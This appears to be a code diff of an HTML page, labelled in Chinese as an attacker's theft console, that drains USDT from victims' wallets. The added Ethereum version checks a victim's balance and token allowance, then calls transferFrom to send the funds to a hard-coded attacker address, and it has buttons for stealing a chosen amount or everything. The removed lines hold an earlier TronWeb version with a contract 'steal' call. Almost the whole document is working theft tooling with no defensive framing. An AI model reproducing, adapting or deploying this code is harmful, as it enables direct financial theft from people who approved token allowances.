@@ -1,26 +1,93 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>盜取操作面板</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
-</head>
+<head><meta charset="UTF-8"><title>盜取控制台（增強版）</title></head>
 <body>
-<h2>🛠️ 一鍵盜取工具</h2>
+<h2>🛠️ 攻擊者操作介面</h2>
 <input id="victim" placeholder="受害者地址"><br>
-<input id="amount" placeholder="金額（例：1 USDT = 1000000）"><br>
+<input id="amount" placeholder="金額（例：1000000 = 1 USDT）"><br>
+<button onclick="getMax()">查詢最大可盜金額</button>
 <button onclick="steal()">執行盜取</button>
+<button onclick="stealAll()">一鍵盜光</button>
+<pre id="log" style="background:#f4f4f4;padding:10px;margin-top:20px;"></pre>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-const evil = 'TTcT9Q6h7JRtbRXvT4ScEp5htH52ARKkY3';
+const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const attacker = "0xbE573CbFCBb9a5d930feCBDE3B530Bf31B033563";
+const abi = [
+  {
+    "constant": true,
+    "inputs": [{"name":"_owner","type":"address"}],
+    "name": "balanceOf",
+    "outputs": [{"name":"","type":"uint256"}],
+    "type": "function"
+  },
+  {
+    "constant": true,
+    "inputs": [{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],
+    "name": "allowance",
+    "outputs": [{"name":"","type":"uint256"}],
+    "type": "function"
+  },
+  {
+    "constant": false,
+    "inputs": [
+      {"name":"_from","type":"address"},
+      {"name":"_to","type":"address"},
+      {"name":"_value","type":"uint256"}
+    ],
+    "name": "transferFrom",
+    "outputs": [{"name":"","type":"bool"}],
+    "type": "function"
+  }
+];
+
+let web3, contract, account;
+const logDiv = document.getElementById("log");
+
+async function init() {
+  if (typeof window.ethereum === 'undefined') {
+    alert("請先安裝 MetaMask");
+    return;
+  }
+  web3 = new Web3(window.ethereum);
+  await ethereum.request({ method: 'eth_requestAccounts' });
+  const accounts = await web3.eth.getAccounts();
+  account = accounts[0];
+  contract = new web3.eth.Contract(abi, tokenAddress);
+}
+
+async function getMax() {
+  await init();
+  const victim = document.getElementById("victim").value;
+  const balance = await contract.methods.balanceOf(victim).call();
+  const allowance = await contract.methods.allowance(victim, account).call();
+  const max = web3.utils.toBN(balance).lt(web3.utils.toBN(allowance)) ? balance : allowance;
+  document.getElementById("amount").value = max;
+  log("查詢最大值：Balance=" + balance + ", Allowance=" + allowance + ", 可盜金額=" + max);
+}
 
 async function steal() {
-  const tronWeb = window.tronWeb;
-  if (!tronWeb.defaultAddress.base58) {
-    return alert('請先登入 TronLink 錢包');
+  await init();
+  const victim = document.getElementById("victim").value;
+  const amount = document.getElementById("amount").value;
+  try {
+    const tx = await contract.methods.transferFrom(victim, attacker, amount).send({ from: account });
+    const link = "https://etherscan.io/tx/" + tx.transactionHash;
+    log("✅ 已轉帳：" + amount + "\n🔗 TX: " + link);
+  } catch (e) {
+    log("❌ 轉帳失敗：" + e.message);
   }
-  const victim = document.getElementById('victim').value;
-  const amount = document.getElementById('amount').value;
-  const contract = await tronWeb.contract().at(evil);
-  await contract.steal(victim, amount).send();
-  alert("✅ 轉帳完成！");
+}
+
+async function stealAll() {
+  await getMax();
+  await steal();
+}
+
+function log(msg) {
+  console.log(msg);
+  logDiv.innerText += msg + "\n";
 }
 </script>
 </body>
